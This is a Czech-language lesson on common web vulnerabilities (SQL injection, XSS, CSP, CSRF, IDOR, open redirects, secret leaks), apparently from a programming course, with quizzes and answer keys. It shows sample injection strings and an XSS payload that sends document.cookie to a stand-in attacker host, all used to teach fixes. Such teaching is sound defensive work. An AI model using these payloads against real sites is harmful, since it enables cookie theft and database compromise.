# Nejčastější zranitelnosti

:::check pretest
Vyhledávání v bazaru sestaví dotaz takhle: `` `SELECT * FROM listings WHERE title LIKE '%${q}%'` ``. Co myslíš, co se stane, když někdo do vyhledávání napíše `' OR 1=1 --`?

### --answer--
Nic zvláštního, vyhledá inzeráty, které ten text obsahují, a nenajde žádný.

#### --why--
Tak by to bylo, kdyby databáze dostala hledaný text jako text. Tady se ale text stane součástí příkazu. Za chvíli uvidíš, co z něj vznikne.

### --correct--
Dotaz vrátí všechny inzeráty, protože vstup změní samotný příkaz SQL.

#### --why--
Apostrof ukončí řetězec v SQL, `OR 1=1` platí pro každý řádek a `--` zbytek zakomentuje. Tomu se říká SQL injection.

### --answer--
Databáze vrátí chybu syntaxe a nic dalšího se nestane.

#### --why--
Chyba by přišla u náhodného apostrofu. Útočník ale vstup složí tak, aby výsledný příkaz byl platný.
:::

Každý web, který přijímá data od lidí, je terčem: bazar s inzeráty, rezervace, komentáře
pod články. Útočník nepotřebuje přístup k serveru. Pošle požadavek, jaký by poslal
prohlížeč, jen s jinými daty, a zkouší, jestli server udělá něco, co autor nečekal.
Seznam nejčastějších chyb vede organizace OWASP (*OWASP Top 10*) a většina z nich má
společný kořen.

> [!REMEMBER]
> **Všechno, co přijde zvenku, jsou data. Chyba vzniká, když se data stanou kódem (SQL, HTML, adresou) nebo když server neověří, že tohle konkrétní smí tenhle konkrétní uživatel.**

## Vstup je jen text

Z pohledu serveru je „zvenku" všechno v požadavku: tělo, query string, cesta, hlavičky
i cookie. Formulář na frontendu s `maxlength` a `type="email"` nic nechrání, požadavek
jde poslat i z terminálu přes `curl` nebo z DevTools.

Z toho plynou dvě otázky, které si u každé routy polož:

1. **Kam vstup teče?** Do SQL dotazu, do HTML stránky, do adresy přesměrování, do logu?
   Na každém takovém místě musí zůstat daty.
2. **Kdo o tom rozhoduje?** Id záznamu z adresy, `userId` z těla nebo role z tokenu,
   který si klient napsal sám, jsou jen tvrzení. Rozhoduje session a databáze.

:::check
Frontend formuláře inzerátu má `<input maxlength="80">` pro název. Musí server délku názvu kontrolovat taky?

### --answer--
Ne, prohlížeč delší text do pole nepustí.

#### --why--
Myslíš si, že každý požadavek přijde z tvého formuláře? Kdokoli pošle `POST` přímo, bez prohlížeče, s názvem o milionu znaků.

### --correct--
Ano, požadavek jde poslat i bez formuláře, třeba přes `curl`.

#### --why--
Kontroly na frontendu jsou pohodlí pro uživatele. Pravidla platí, jen když je vynutí server.
:::

## SQL injection

[[SQL injection]] vzniká, když se vstup vloží do textu SQL dotazu. Zkus předpovědět, jaký
dotaz dostane databáze od přihlášení, které hledá účet podle e-mailu:

:::live js predict
```js
const email = "' OR '1'='1";
const sql = `SELECT * FROM users WHERE email = '${email}'`;
console.log(sql);
```
--question-- Co vypíše `console.log`? Napiš celý dotaz.
--expected-- SELECT * FROM users WHERE email = '' OR '1'='1'
--why-- Apostrof ze vstupu uzavřel řetězec, který začal v dotazu. Zbytek vstupu už databáze čte jako SQL: podmínka `'1'='1'` platí vždy, takže dotaz vrátí všechny účty a první z nich se „přihlásí". Stejně jde přidat `UNION SELECT` a číst jiné tabulky.
:::

Oprava není hledat nebezpečné znaky. Oprava je **[[parametrizovaný dotaz]]**: SQL
s otazníky a hodnoty zvlášť. Databáze nejdřív dotaz přeloží a hodnoty dosadí až potom,
takže z nich nikdy nemůže vzniknout příkaz.

```js
// data zvlášť, dotaz zvlášť
db.prepare('SELECT * FROM users WHERE email = ?').get(email);
db.prepare("SELECT * FROM listings WHERE title LIKE '%' || ? || '%'").all(q);
```

Otazník funguje jen místo **hodnoty**. Jméno sloupce v `ORDER BY` ani směr `ASC`/`DESC`
parametrem být nemůže. Tam pomůže jen seznam povolených hodnot (*allowlist*):

```js
const SORT_COLUMNS = { price: 'price', newest: 'created_at' };
const column = SORT_COLUMNS[sort] ?? 'created_at';
```

Zkus v ukázce změnit e-mail na `eva@klub.cz` a pak na `x' --` a sleduj, kde v dotazu
končí vstup.

:::check
Kolega „opravil" SQL injection takhle: `` `… WHERE email = '${email.replaceAll("'", "")}'` ``. Proč to není správná oprava?

### --answer--
Je správná, bez apostrofu řetězec ukončit nejde.

#### --why--
Myslíš si, že apostrof je jediná cesta? U čísel v dotazu (`WHERE id = ${id}`) žádný apostrof není a `1 OR 1=1` projde. A mazání znaků navíc rozbije jména jako `O'Brien`.

### --correct--
Vstup je pořád součástí textu dotazu; opraví to až parametrizovaný dotaz, kde jsou hodnoty oddělené.

#### --why--
Čištění znaků je závod s útočníkem, který vždy najde další variantu. Parametr z principu nemůže změnit příkaz.
:::

:::explain
Na pohovoru dostaneš otázku: „Proč parametrizovaný dotaz chrání před SQL injection?" Odpověz vlastními slovy.

## --model--
U parametrizovaného dotazu jde do databáze zvlášť text příkazu s otazníky a zvlášť
hodnoty. Databáze příkaz přeloží dřív, než hodnoty zná, takže hodnota zůstane vždycky
jen hodnotou, i když obsahuje apostrof nebo SQL. Parametr ale jde použít jen místo
hodnoty, ne místo jména sloupce; tam se použije seznam povolených hodnot.

## --checklist--
- Příkaz a hodnoty jdou do databáze zvlášť.
- Databáze příkaz přeloží dřív, než dosadí hodnoty.
- Hodnota nemůže změnit příkaz, ani když obsahuje SQL.
- Jméno sloupce parametrem být nemůže, tam pomůže allowlist.
:::

## XSS na serveru: escapování a kontext

[[XSS]] znáš z lekce [Text a HTML](see:js-dom/strom-dom#text-a-html-textcontent-a-innerhtml):
cizí text vložený jako HTML spustí cizí skript. Na serveru, který skládá HTML stránku
z šablonového řetězce, `textContent` nemáš. Cizí text musíš **escapovat**: nahradit
znaky, které v HTML něco znamenají, jejich entitami (`&` → `&amp;`, `<` → `&lt;`,
`>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;`). Pořadí má jednu past: `&` nahraď první,
jinak rozbiješ entity, které jsi právě vyrobil.

Escapování ale řeší jen to, aby text **nevytvořil značku**. Neřeší, co znamená uvnitř
atributu. Zkus předpovědět:

:::live js predict
```js
const escapeHtml = (text) => text
  .replaceAll('&', '&amp;').replaceAll('<', '&lt;')
  .replaceAll('>', '&gt;').replaceAll('"', '&quot;');

const website = 'javascript:alert(document.cookie)';
console.log(`<a href="${escapeHtml(website)}">Web prodejce</a>`);
```
--question-- Co vypíše `console.log`?
--expected-- <a href="javascript:alert(document.cookie)">Web prodejce</a>
--why-- V adrese nejsou žádné znaky, které by `escapeHtml` měnila, takže projde beze změny. Odkaz je platné HTML, ale po kliknutí spustí JavaScript. U adres z venku proto kontroluj i protokol: pusť jen `http:` a `https:`.
:::

Frameworky (React, Vue, šablonové systémy) escapují text samy. Díry zůstávají tam, kde
to obejdeš: `dangerouslySetInnerHTML`, `v-html`, `href` z dat uživatele a HTML složené
ručně v řetězci.

Zkus v ukázce místo `javascript:` dát `https://kola-brno.cz` a pak `"><script>` a sleduj,
co escapování udělá.

:::check
Profil prodejce vypíše na serveru `` `<p>${escapeHtml(bio)}</p>` `` a `` `<a href="${escapeHtml(website)}">` ``. Která z těch dvou míst jsou po escapování bezpečná?

### --answer--
Obě, escapování odstraní všechno nebezpečné.

#### --why--
Myslíš si, že escapování zná kontext? Mění jen pět znaků. Adresa `javascript:…` žádný z nich neobsahuje.

### --correct--
Jen odstavec; do `href` projde adresa `javascript:…`, kterou escapování nezmění.

#### --why--
V textu odstavce stačí, aby nevznikla značka. V `href` je navíc potřeba zkontrolovat protokol.

### --answer--
Ani jedno, na serveru se HTML nikdy escapovat nedá.

#### --why--
Myslíš si, že escapování na serveru nefunguje? V textu stránky funguje spolehlivě. Problém je jen u míst, kde text něco znamená i bez značek.
:::

## CSP: druhá pojistka proti XSS

Jednu zapomenutou `escapeHtml` najdeš vždycky. Proto se k escapování přidává hlavička
[[CSP]] (*Content Security Policy*), kterou server posílá se stránkou. Říká prohlížeči,
odkud smí stránka spouštět skripty:

```text
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
```

S `script-src 'self'` prohlížeč spustí jen skripty ze souborů tvého webu. Vložené
`<script>…</script>` ani atributy `onerror` neběží, takže útočník, který HTML do stránky
dostane, skript nespustí. Hodnota `'unsafe-inline'` tuhle ochranu vypne. `frame-ancestors
'none'` zakáže vložit stránku do cizího `<iframe>`, což brání podvrženým kliknutím.

> [!PITFALL]
> CSP s `script-src 'self' 'unsafe-inline'` vypadá v hlavičce bezpečně, ale inline skripty
> útočníka pustí. Když stránka inline skript potřebuje, přesuň ho do souboru.

:::check
Stránka posílá `Content-Security-Policy: script-src 'self'` a útočník do komentáře dostane `<img src="x" onerror="fetch('https://zly.cz?c=' + document.cookie)">`. Co se stane?

### --answer--
Kód se spustí, CSP hlídá jen značky `<script>`.

#### --why--
Myslíš si, že CSP hlídá jen značku `script`? `script-src` řídí veškerý JavaScript, i atributy `on…`.

### --correct--
Značka se vykreslí, ale kód z `onerror` prohlížeč nespustí.

#### --why--
Bez `'unsafe-inline'` se inline kód nespustí. Escapování je pořád potřeba, CSP je pojistka.
:::

## CSRF: požadavek z cizí stránky

[[CSRF]] (*cross-site request forgery*) zneužívá toho, že prohlížeč cookie posílá sám.
Cizí stránka odešle formulář na tvůj server a přihlášený uživatel o ničem neví. Obrana
má tři vrstvy:

1. session cookie se `SameSite=Lax` (znáš z lekce [Session a cookies](see:auth-bezpecnost/session-a-cookies#atributy-cookie)),
2. žádné změny přes `GET`,
3. u změn kontrola hlavičky `Origin`: prohlížeč do ní dá adresu stránky, ze které
   požadavek odešel, a skript ji změnit nemůže. Když neodpovídá tvému webu, vrať `403`.

Knihovny a frameworky k tomu přidávají CSRF token: náhodnou hodnotu ve formuláři, kterou
cizí stránka nezná.

:::check
Server má session cookie se `SameSite=Lax`, ale mazání inzerátu je `GET /inzeraty/12/smazat`. Útočník pošle přihlášenému prodejci odkaz. Smaže se inzerát po kliknutí?

### --answer--
Ne, `SameSite=Lax` cookie z cizího webu neposílá.

#### --why--
Myslíš si, že `Lax` blokuje všechno? Při prokliku odkazem (navigace metodou `GET`) cookie odejde.

### --correct--
Ano, u prokliku odkazem `Lax` cookie pošle, a `GET` tady mění data.

#### --why--
Proto platí pravidlo: `GET` jen čte. Změny patří do `POST`, `PATCH` a `DELETE`.
:::

## IDOR: cizí záznam podle id

[[IDOR]] (*insecure direct object reference*) je nejčastější chyba autorizace v API.
Routa ověří, že je uživatel přihlášený, a pak vrátí záznam podle id z adresy:

```js
// přihlášený je, ale čí je zpráva 42?
const message = db.prepare('SELECT * FROM messages WHERE id = ?').get(id);
```

Kdo změní v adrese `42` na `43`, čte cizí zprávy. Oprava: vlastnictví je součástí
dotazu, ne kontrola „někde potom".

```js
db.prepare('SELECT * FROM messages WHERE id = ? AND (sender_id = ? OR recipient_id = ?)')
  .get(id, user.id, user.id);
```

Když záznam nenajdeš, vrať `404`. U soukromých dat je `404` lepší než `403`: neprozradí,
že záznam s tím id existuje. Náhodná id (UUID) místo pořadových čísel hádání ztíží, ale
kontrolu oprávnění nenahradí.

:::check
Přihlášená Jana pošle `PATCH /api/listings/7` s novou cenou. Inzerát 7 patří Petrovi. Server ověří jen, že je Jana přihlášená, a cenu změní. Jak se ta chyba jmenuje?

### --expected-- ignore-case
IDOR

### --accept--
insecure direct object reference
chybějící autorizace
broken access control

### --why--
Autentizace proběhla (server ví, že je to Jana), ale autorizace k tomuhle konkrétnímu
záznamu chybí. Oprava: `WHERE id = ? AND seller_id = ?`.
:::

## Otevřené přesměrování

Po přihlášení se často vrací na stránku z parametru: `/prihlaseni?next=/moje-inzeraty`.
Když server přesměruje na cokoli, co v `next` přijde, vznikne [[otevřené přesměrování]]:
útočník pošle odkaz na tvůj skutečný web, který po přihlášení skončí na jeho podvržené
stránce. Zkus předpovědět:

:::live js predict
```js
const next = '//podvodny-bazar.cz/prihlaseni';
console.log(next.startsWith('/'));
console.log(new URL(next, 'https://kola-brno.cz').host);
```
--question-- Co vypíšou dva řádky?
--expected--
```text
true
podvodny-bazar.cz
```
--why-- Adresa začínající `//` je relativní jen vůči protokolu: prohlížeč k ní doplní `https:` a jde na jinou doménu. Kontrola „začíná lomítkem" ji pustí. Bezpečná cesta začíná `/`, ale ne `//` ani `/\`, nebo ji porovnej se seznamem povolených cest.
:::

:::check
Která hodnota `next` je bezpečná pro přesměrování po přihlášení?

### --answer--
`https://kola-brno.cz.podvod.cz/`

#### --why--
Myslíš si, že stačí, když adresa obsahuje tvou doménu? Tahle doména patří útočníkovi, `kola-brno.cz` je jen její část.

### --correct--
`/moje-inzeraty?razeni=cena`

#### --why--
Začíná jedním lomítkem a vede na cestu v rámci tvého webu.

### --answer--
`//kola-brno.cz@podvod.cz`

#### --why--
Myslíš si, že `//` zůstane na tvém webu? Dvě lomítka začínají novou adresu a část před `@` je jen jméno uživatele v adrese.
:::

## Omezení zneužití: rate limit, velikost a hlavičky

Některé útoky nepotřebují chybu v logice, jen hodně požadavků:

- **Hádání hesel:** [[rate limit]] omezí počet pokusů na účet nebo IP adresu za časové
  okno, třeba 5 za 15 minut. Nad limit server vrátí `429 Too Many Requests` a hlavičku
  `Retry-After` s počtem sekund.
- **Obří vstupy:** tělo požadavku čti s limitem (`413 Payload Too Large`) a u textových
  polí hlídej délku. Heslo o velikosti megabajtu zaměstná pomalý hash na dlouhé sekundy.
- **Bezpečnostní hlavičky:** `X-Content-Type-Options: nosniff` (prohlížeč nehádá typ
  souboru), `Referrer-Policy: strict-origin-when-cross-origin` (adresa s tokenem neuteče
  do cizího webu) a CSP s `frame-ancestors`.

:::check
Přihlášení vrací po pěti špatných pokusech `429`. Útočník zkouší jedno heslo `Leto2026!` na deseti tisících různých e-mailů. Zastaví ho limit „5 pokusů na e-mail"?

### --answer--
Ano, po pěti pokusech dostane `429`.

#### --why--
Myslíš si, že limit počítá pokusy celkem? Počítá je pro každý e-mail zvlášť a na každý e-mail přijde jen jeden pokus.

### --correct--
Ne, na každý e-mail zkusí jen jednou. Proti tomu pomůže limit i na IP adresu.

#### --why--
Útok „jedno heslo, hodně účtů" (*password spraying*) obchází limit na účet. Proto se limity kombinují.
:::

## Únik tajemství a chybových hlášek

Útočník se hodně dozví z toho, co mu server řekne sám:

- **Stack trace v odpovědi** ukáže cesty k souborům, verze knihoven a někdy i SQL dotaz.
  Klient dostane obecné „Na serveru se něco pokazilo", podrobnosti jdou do logu.
- **Tajemství v Gitu:** `.env` s heslem k databázi v repozitáři zůstane v historii i po
  smazání. Patří do `.gitignore` a unikle tajemství se musí **vyměnit**, ne jen smazat.
- **Tajemství ve frontendu:** všechno, co jde do buildu (ve Vite proměnné `VITE_…`), přečte
  každý návštěvník. API klíč s právem zápisu patří jen na server.
- **Hesla a tokeny v logu:** loguj e-mail a výsledek akce, nikdy tělo přihlášení.

:::check
Kolega omylem pushnul na veřejný GitHub `.env` s klíčem k platební bráně. Hned další commit soubor smazal. Co je potřeba udělat?

### --answer--
Nic dalšího, soubor už v repozitáři není.

#### --why--
Myslíš si, že smazání v dalším commitu soubor odstraní? Starý commit ho obsahuje dál a roboti, kteří GitHub prohledávají, ho najdou za pár minut.

### --correct--
Klíč v platební bráně zneplatnit a vydat nový.

#### --why--
Unikle tajemství je třeba považovat za prozrazené. Přepsání historie pomůže s úklidem, ale bezpečí vrátí jen nový klíč.
:::

## Zranitelné závislosti

Projekt v Node má stovky balíčků, většinu z nich nepřímo. Chyba v kterémkoli z nich je
chyba tvé aplikace.

- `npm audit` porovná `package-lock.json` s databází známých zranitelností a vypíše, co
  aktualizovat. Neber ho doslova: část nálezů se týká nástrojů, které na serveru neběží.
- `package-lock.json` patří do Gitu, aby se na serveru instalovaly přesně otestované
  verze (`npm ci`).
- Před přidáním balíčku ověř jméno. Útočníci publikují balíčky s překlepem
  (`expresss`) a skripty `postinstall`, které se spustí už při instalaci.

:::check
`npm audit` hlásí kritickou zranitelnost v balíčku, který projekt používá jen v testech na tvém počítači. Jak naléhavé to je ve srovnání se stejnou chybou v knihovně pro zpracování požadavků na serveru?

### --answer--
Stejně naléhavé, kritická je kritická.

#### --why--
Myslíš si, že záleží jen na stupni v hlášení? Záleží i na tom, jestli se zranitelný kód dostane k datům útočníka.

### --correct--
Méně naléhavé: testovací nástroj nezpracovává požadavky útočníka. Chyba v knihovně na serveru ano.

#### --why--
Aktualizovat je dobré obojí, ale pořadí určuje, kam se útočník se svými daty dostane.
:::

## Typické chyby a pasti

> [!PITFALL] Dotaz složený z řetězce „jen pro řazení"
> `` `ORDER BY ${req.query.sort}` `` vypadá neškodně, protože tam není uživatelský text.
> Hodnota `price; DROP TABLE listings` nebo `(CASE WHEN …)` ale projde. **Oprava:**
> allowlist povolených sloupců.

> [!PITFALL] `escapeHtml` v atributu bez uvozovek
> `` `<img alt=${escapeHtml(title)}>` `` s názvem `x onerror=alert(1)` přidá atribut,
> protože mezera escapovaná není. **Oprava:** hodnoty atributů vždy v uvozovkách.

> [!PITFALL] `403` u cizího soukromého záznamu
> Na `GET /api/messages/43` přijde `403` pro existující cizí zprávu a `404` pro
> neexistující. Útočník tak zjistí, která id existují. **Oprava:** u soukromých dat
> `404` v obou případech.

> [!PITFALL] Kontrola `next.startsWith('/')`
> Pustí `//podvod.cz`, které prohlížeč bere jako jinou doménu. **Oprava:** povol jen
> cestu, která začíná `/` a pokračuje jiným znakem než `/` nebo `\`.

> [!PITFALL] `{ error: err.message, stack: err.stack }` v odpovědi 500
> Při vývoji pohodlné, na produkci mapa tvého serveru pro útočníka. **Oprava:** obecná
> zpráva klientovi, podrobnosti do `console.error`.

:::check
Která z těch chyb umožní útočníkovi spustit JavaScript v prohlížeči jiného uživatele?

### --answer--
`ORDER BY ${req.query.sort}` v dotazu.

#### --why--
Myslíš si, že SQL injection běží v prohlížeči? Běží v databázi na serveru.

### --correct--
`<img alt=${escapeHtml(title)}>` bez uvozovek.

#### --why--
Mezera v názvu ukončí hodnotu atributu a `onerror=…` se stane novým atributem se skriptem.

### --answer--
`403` u cizí existující zprávy.

#### --why--
Myslíš si, že únik informace o existenci spouští kód? Prozradí jen, která id existují.
:::

## Kde to najdeš v MDN

- [Cross-site scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS) —
  typy XSS, kontexty v HTML a obrana escapováním a CSP.
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) —
  jak hlavička funguje, direktivy a nasazení v režimu `Report-Only`.
- [Cross-site request forgery (CSRF)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF) —
  kdy prohlížeč cookie pošle a jak se bránit.
- [429 Too Many Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/429) —
  stav pro rate limit a hlavička `Retry-After`.

> [!NOTE]
> Přehled nejčastějších chyb je v [OWASP Top 10](https://owasp.org/Top10/) a návody na
> opravy v [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/).

Příště dostaneš API bazaru, ve kterém je každá z těchhle chyb, a jednu po druhé opravíš
podle hlášení útoku.

# --questions--

## --question--

API vrací seznam inzerátů podle kategorie:

```js
const rows = db.prepare(`SELECT * FROM listings WHERE category = '${category}' AND status = 'active'`).all();
```

Útočník pošle `?category=kola' --`. Které inzeráty dostane? Vyber jednu odpověď.

### --answer--
Žádné, kategorie `kola' --` neexistuje.

#### --why--
Myslíš si, že se hledá kategorie s tímhle názvem? Apostrof uzavře řetězec a databáze hledá kategorii `kola`.

### --correct--
Všechny inzeráty v kategorii kola, i prodané a skryté.

#### --why--
`--` zakomentuje zbytek dotazu včetně `AND status = 'active'`. Vstup tak změnil podmínku, kterou napsal autor.

### --answer--
Jen aktivní inzeráty v kategorii kola.

#### --why--
Myslíš si, že podmínka na stav zůstane? Za `--` už databáze nic nečte.

### --see--
auth-bezpecnost/owasp-zranitelnosti#sql-injection

## --question--

Server posílá stránku s hlavičkou `Content-Security-Policy: script-src 'self' 'unsafe-inline'`. Které slovo v hlavičce způsobí, že vložený `<script>` útočníka poběží? Napiš ho.

### --expected--
'unsafe-inline'

### --accept--
unsafe-inline

### --why--
`'unsafe-inline'` povolí inline skripty i atributy `on…`, a tím ochranu CSP proti XSS
vypne. Skripty stránky patří do souborů.

### --see--
auth-bezpecnost/owasp-zranitelnosti#csp-druha-pojistka-proti-xss

## --question--

Routa `GET /api/orders/:id` ověří session a pak volá `SELECT * FROM orders WHERE id = ?`. Co v dotazu chybí, aby uživatel neviděl cizí objednávky? Napiš podmínku, kterou přidáš za `id = ?` (sloupec s vlastníkem je `customer_id`).

### --expected--
AND customer_id = ?

### --accept--
and customer_id = ?
customer_id = ?
AND customer_id = user.id

### --why--
Vlastnictví patří přímo do dotazu: `WHERE id = ? AND customer_id = ?` s id z session.
Když řádek nevyjde, odpověz `404`.

### --see--
auth-bezpecnost/owasp-zranitelnosti#idor-cizi-zaznam-podle-id
